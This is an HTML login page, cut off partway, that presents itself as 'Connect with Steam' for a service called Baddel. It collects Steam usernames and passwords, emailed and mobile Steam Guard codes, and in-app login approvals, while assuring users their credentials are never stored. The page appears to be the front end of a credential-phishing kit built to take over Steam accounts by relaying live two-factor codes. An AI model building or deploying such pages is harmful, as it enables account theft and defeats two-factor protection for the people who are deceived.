<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<link rel="stylesheet" href="../../commonWeb/css/common.css">
	<link rel="stylesheet" href="css/style.css">
	<title>Connect with Steam</title>
</head>

<body class="apple-tv-theme">
	<div class="container main-wrapper">
		<header class="main-header">
			<div class="header-content">
				<div class="brand">
					<img class="steam-logo-icon" src="../../commonWeb/img/icon-steam-logo.svg" alt="Steam logo">
					<div class="brand-text">
						<h1 class="title">Connect with Steam</h1>
						<p class="subtitle">Securely link your account to Baddel</p>
					</div>
				</div>
				<button class="close-btn" id="closeModalBtn" title="Close (Esc)">
					<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
				</button>
			</div>
		</header>

		<main class="main-content">
			<form id="main-form" class="main-form" action="/" method="GET">
				<!-- 1. LOGIN INFO (Username/Password) -->
				<fieldset id="getLoginInfo" class="auth-view" style="display: none;">
					<div class="view-header">
						<h2 class="section-title">Sign In</h2>
						<p class="section-desc">Enter your Steam credentials to continue.</p>
					</div>
					
					<div class="field-group floating-label">
						<input class="modern-input" type="text" id="step-1-username" name="username" placeholder=" " required disabled="disabled">
						<label for="step-1-username">Steam Username</label>
					</div>

					<div class="field-group floating-label">
						<div class="password-wrapper">
							<input class="modern-input" type="password" id="step-1-password" name="password" placeholder=" " required disabled="disabled">
							<label for="step-1-password">Password</label>
							<button type="button" class="toggle-password-btn" title="Toggle visibility">
								<svg class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
							</button>
						</div>
					</div>

					<!-- Security Reassurance -->
					<div class="security-note">
						<div class="security-item">
							<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
							<span>Your credentials are encrypted and never stored on our servers.</span>
						</div>
						<div class="security-item">
							<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
							<span>Baddel ensures your privacy and data security.</span>
						</div>
					</div>

					<div class="error-box no-error" id="bad-password">
						<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
						<span>The account name or password that you have entered is incorrect.</span>
					</div>

					<div class="error-box no-error" id="steamguard-expired">
						<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
						<span>Steam Guard session expired. Please log in again.</span>
					</div>
				</fieldset>

				<!-- 2. STEAM GUARD EMAIL -->
				<fieldset id="steamGuardEmail" class="auth-view" style="display:none;">
					<div class="view-header">
						<h2 class="section-title">Check Your Email</h2>
						<p class="section-desc">We've sent a code to your Steam-linked email address.</p>
					</div>

					<div class="field-group code-input-container">
						<input class="modern-input steam-guard-input" type="text" id="step-1-code" name="code" maxlength="5" placeholder="ABCDE" disabled="disabled">
						<div class="timer-display" id="emailTimer">
							Code expires in <span class="timer-val">60s</span>
							<span class="resend-wrapper" style="display:none;">
								&bull; <a href="#" class="resend-link" onclick="resendCode()">Resend</a>
							</span>
						</div>
					</div>

					<div class="info-note">
						<p>If you don't see it, check your spam folder or wait a minute before requesting a new one.</p>
						<a href="https://help.steampowered.com/en/wizard/HelpWithSteamGuardCode" class="help-link" target="_blank">Need help?</a>
					</div>

					<div class="error-box no-error">
						<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
						<span>Invalid code. Please check and try again.</span>
					</div>
				</fieldset>

				<!-- 3. STEAM GUARD PHONE (Code) -->
				<fieldset id="steamGuardPhone" class="auth-view" style="display:none;">
					<div class="view-header">
						<h2 class="section-title">Steam Mobile App</h2>
						<p class="section-desc">Enter the 5-character code from your Steam Mobile Authenticator.</p>
					</div>

					<div class="field-group code-input-container">
						<input class="modern-input steam-guard-input" type="text" id="step-4-code" name="code" maxlength="5" placeholder="ABCDE" disabled="disabled">
						<div class="timer-display" id="phoneTimer">
							New code in <span class="timer-val">30s</span>
							<span class="resend-wrapper" style="display:none;">
								&bull; <a href="#" class="resend-link" onclick="resendCode()">Restart Login</a>
							</span>
						</div>
					</div>

					<div class="error-box no-error">
						<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
						<span>Invalid code. Please check and try again.</span>
					</div>
				</fieldset>

				<!-- 4. STEAM GUARD CONFIRM (Approval Request) -->
				<fieldset id="steamGuardConfirm" class="auth-view" style="display:none;">
					<div class="view-header">
						<h2 class="section-title">Approve Login in Steam App</h2>
						<p class="section-desc">Open your Steam mobile app and tap <strong>Approve</strong>. We will continue automatically.</p>
					</div>

					<div class="waiting-container">
						<div class="approval-visual">
							<div class="pulse-ring"></div>
							<div class="device-icon">
								<svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
							</div>
						</div>
						<div class="waiting-status">
							<div class="spinner-small"></div>
							<span>Waiting for your approval. This will continue automatically.</span>
						</div>
					</div>

					<div class="auth-options-divider no-fallback">
						<span>OR USE ANOTHER METHOD</span>
					</div>

					<div class="auth-methods-list">
						<a id="fallback-tag" class="auth-method-item no-fallback" href="#">
							<div class="method-icon">
